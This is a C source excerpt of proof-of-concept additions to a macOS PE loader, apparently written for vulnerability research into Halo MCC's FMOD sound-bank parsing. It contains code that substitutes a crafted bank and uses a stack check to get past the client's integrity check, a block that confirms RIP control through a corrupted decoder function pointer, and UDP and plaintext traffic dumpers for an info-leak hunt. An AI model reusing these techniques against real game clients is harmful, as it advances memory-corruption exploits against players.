/* Project Reclaimer macOS loader (shim/src/peload.c) PoC additions — Halo MCC FMOD research.
   These are the ONLY loader changes used to reproduce (a) the live in-game crash and
   (b) confirmed RIP control in the real halo3.dll. Both are env-gated and OFF by default.
   NOT the whole loader — just the two added blocks, with where they go. */

/* ===== 1) i_CreateFileW ADD-bank redirect: add sfx_subst() next to font_subst(), and call
        it in i_CreateFileW read opens:  if(acc&0x80000000){ font_subst(p,sizeof p); sfx_subst(p,sizeof p); } ===== */

// FMOD sound-bank redirect (research PoC; off unless PELOAD_FMOD_CRAFT=<file> set).
// A mod's asset redirect (halo3+0x172fc8) points a map's `fmod\pc\sfx.<name>.fsb` ADD
// bank at the mod's own copy, checked before the base map's package. This emulates that
// final step at the file layer: when the engine opens an ADD bank at MAP LOAD, serve the
// crafted bank instead, so the real client's real createStream/FMOD opens the crafted
// bytes. The init-time main `sfx.fsb` is left alone so the crash lands at map load.
static void sfx_subst(char *p, int cap){
    const char *craft=getenv("PELOAD_FMOD_CRAFT"); if(!craft||!*craft) return;
    const char *b=p; for(char*q=p;*q;q++) if(*q=='/') b=q+1;      // basename
    int L=(int)strlen(b);
    if(L<9 || strncmp(b,"sfx.",4) || strcasecmp(b+L-4,".fsb")) return;  // sfx.<name>.fsb
    if(!strcmp(b,"sfx.fsb")) return;                             // skip the main bank (init-time)
    if(access(craft,R_OK)!=0) return;
    // Only redirect when halo3/FMOD opens the bank at MAP LOAD (createStream), NOT when
    // the Rust client opens it to hash it for the join integrity check — otherwise the
    // crafted bytes fail the Steam-manifest check and the join is refused before load.
    // Distinguish by caller: FMOD's open has a halo3.dll (>=0x180000000) return address
    // on the stack; the client's integrity read is pure Rust (exe, 0x140000000 range).
    uint64_t *sp=(uint64_t*)__builtin_frame_address(0); int from_halo3=0;
    for(int i=0;i<160;i++){ uint64_t v=sp[i];
        if(v>=0x180000000ULL && v<0x184768000ULL){ from_halo3=1; break; } }
    if(!from_halo3) return;                                      // client/integrity read -> leave original
    char msg[1300]; int k=snprintf(msg,sizeof msg,"  [fmod-craft] ADD bank %s -> crafted %s (map-load createStream)\n",b,craft);
    (void)!write(2,msg,(size_t)k);
    snprintf(p,cap,"%s",craft);
}

/* ===== 2) fmod_harness RIPTEST block: inside fmod_harness(), right after the setup line,
        drives the real decode dispatcher halo3+0x500e00 to confirm RIP control ===== */

    // PELOAD_FMOD_RIPTEST[=<hexptr>]: drive halo3's REAL decode dispatcher (0x500e00,
    // the readData sink) with a codec instance whose decoder function pointer (+0xa8) is
    // a corrupted value -- exactly what a heap overflow / UAF of the codec object leaves.
    // readData does `call [instance+0xa8]` with NO CFG check (GuardCF off on this build),
    // so control transfers to that value -> RIP = the planted pointer. The process then
    // takes a FETCH fault at that address and peload's crash handler prints RIP.
    { const char*rt=getenv("PELOAD_FMOD_RIPTEST");
      if(rt && rt[0]){
        typedef int (__attribute__((ms_abi)) *read_t)(void*,void*,uint32_t,uint32_t*);
        uint64_t tag = (rt[0]=='1'&&!rt[1]) ? 0x4141414141414141ULL : strtoull(rt,0,0);
        uint8_t *inst=calloc(1,0x400); uint8_t *outbuf=calloc(1,0x1000); uint32_t br=0;
        *(uint32_t*)(inst+0x13c)=0; *(uint32_t*)(inst+0x30)=1;
        *(uint64_t*)(inst+0xa8)=tag; *(uint64_t*)(inst+0x80)=tag;   // corrupted decoder fn-ptrs
        printf("RIPTEST: real halo3+0x500e00 (readData), instance+0xa8=0x%016llx, CFG=%s\n",
               (unsigned long long)tag,"off"); fflush(stdout);
        ((read_t)(h3+0x500e00))(inst,outbuf,0x1000,&br);   // -> call [instance+0xa8] -> RIP=tag
        printf("RIPTEST: returned without transferring control (unexpected)\n"); fflush(stdout);
        return; } }
/* end RIPTEST block */

/* ===== 3) UDP payload dump (info-leak experiment): add udp_dump() next to udp_tracef(),
        and call it in i_ws2_sendto/i_ws2_recvfrom:  if(r>0)udp_dump("TX"/"RX",buf,(int)r); ===== */

// PELOAD_DUMP_UDP=<file>: research info-leak hunt. Append a hex dump of each UDP
// datagram payload (what a malicious server would see from a joining client). Off by default.
static void udp_dump(const char*dir,const char*buf,int len){
    const char*f=getenv("PELOAD_DUMP_UDP"); if(!f||!*f||len<=0) return;
    static int dfd=-2; if(dfd==-2) dfd=open(f,O_WRONLY|O_CREAT|O_APPEND,0644);
    if(dfd<0) return;
    char hdr[48]; int hn=snprintf(hdr,sizeof hdr,"%s pid=%d len=%d ",dir,getpid(),len); (void)!write(dfd,hdr,(size_t)hn);
    static const char hx[]="0123456789abcdef"; int n=len>512?512:len; char line[1030];
    for(int i=0;i<n;i++){ unsigned char c=(unsigned char)buf[i]; line[2*i]=hx[c>>4]; line[2*i+1]=hx[c&15]; }
    line[2*n]='\n'; (void)!write(dfd,line,(size_t)(2*n+1)); }
static int MSABI i_ws2_sendto(WSASOCK s,const char*buf,int len,int fl,const void*to,int tl){ struct sockaddr_storage ss; if(to)peer_gip_rec((int)s,to,tl); t_sa_send=1; int bl=to?sa_w2b(to,tl,&ss):0; t_sa_send=0; ssize_t r=sendto((int)s,buf,len,fl,bl?(struct sockaddr*)&ss:0,bl); if(r<0){ws2_err(errno);if(getenv("PELOAD_TRACE_UDP")){char b[96];int k=snprintf(b,sizeof b,"  [udp] TX fd=%d FAIL errno=%d\n",(int)s,errno);(void)!write(2,b,k);}return -1;} if(bl)udp_tracef("TX",s,&ss,(int)r); if(r>0)udp_dump("TX",buf,(int)r); return (int)r; }
static __thread uint32_t t_rx_ip; static __thread uint16_t t_rx_port;   // the last datagram's source on this thread (stats.c voice source tally)
static int MSABI i_ws2_recvfrom(WSASOCK s,char*buf,int len,int fl,void*from,int*fl2){ struct sockaddr_storage ss; socklen_t sl=sizeof ss; ssize_t r=recvfrom((int)s,buf,len,fl,(struct sockaddr*)&ss,&sl); if(r<0){ws2_err(errno);return -1;} if(r>=0)udp_tracef("RX",s,&ss,(int)r); if(r>0)udp_dump("RX",buf,(int)r);
    if(ss.ss_family==AF_INET){ t_rx_ip=((struct sockaddr_in*)&ss)->sin_addr.s_addr; t_rx_port=ntohs(((struct sockaddr_in*)&ss)->sin_port); }

/* ===== 4) PLAINTEXT app-layer dump (info-leak hunt, CORRECTED threat model): add
        plain_dump() and call it in i_ws2_WSASendMsg/i_ws2_WSARecvMsg. A malicious
        dedicated server IS the QUIC endpoint and DECRYPTS everything, so the bytes that
        matter are the PLAINTEXT application-layer datagrams, not the QUIC ciphertext on
        sendto/recvfrom. The engine's loopback native-UDP game transport uses
        WSASendMsg/WSARecvMsg -- exactly the post-decrypt content a server sees/relays.
        (The earlier udp_dump on sendto/recvfrom saw only QUIC ciphertext -- wrong syscall.)
        Off by default. See poc-fsb5/infoleak-plaintext-FINDINGS.md for the result. ===== */

// PELOAD_DUMP_PLAIN=<file>: dump full plaintext datagram + peer port + 8-byte ASCII magic.
static void plain_dump(const char*dir,const char*buf,int len,const struct sockaddr_storage*ss){
    const char*f=getenv("PELOAD_DUMP_PLAIN"); if(!f||!*f||len<=0) return;
    static int pfd=-2; if(pfd==-2) pfd=open(f,O_WRONLY|O_CREAT|O_APPEND,0644);
    if(pfd<0) return;
    int port=0; if(ss&&ss->ss_family==AF_INET) port=ntohs(((const struct sockaddr_in*)ss)->sin_port);
    char mg[9]; int mm=len<8?len:8; for(int i=0;i<mm;i++){ unsigned char c=(unsigned char)buf[i]; mg[i]=(c>=32&&c<127)?(char)c:'.'; } mg[mm]=0;
    char hdr[96]; int hn=snprintf(hdr,sizeof hdr,"%s pid=%d port=%d len=%d magic=%s ",dir,getpid(),port,len,mg); (void)!write(pfd,hdr,(size_t)hn);
    static const char hx[]="0123456789abcdef"; int n=len>2048?2048:len; static __thread char line[4100];
    for(int i=0;i<n;i++){ unsigned char c=(unsigned char)buf[i]; line[2*i]=hx[c>>4]; line[2*i+1]=hx[c&15]; }
    line[2*n]='\n'; (void)!write(pfd,line,(size_t)(2*n+1)); }

// Call sites (the native-UDP private-bridge transport; reassembled TX gather buffer / RX buffer):
//   i_ws2_WSASendMsg(): after sendto, before iocp_post:  if(r>0)plain_dump("TX",gbuf,(int)r,bl?&ss:0);
//   i_ws2_WSARecvMsg(): after recvfrom, before scatter:  if(r>0)plain_dump("RX",rbuf,(int)r,&ss);
/* end plain_dump block */
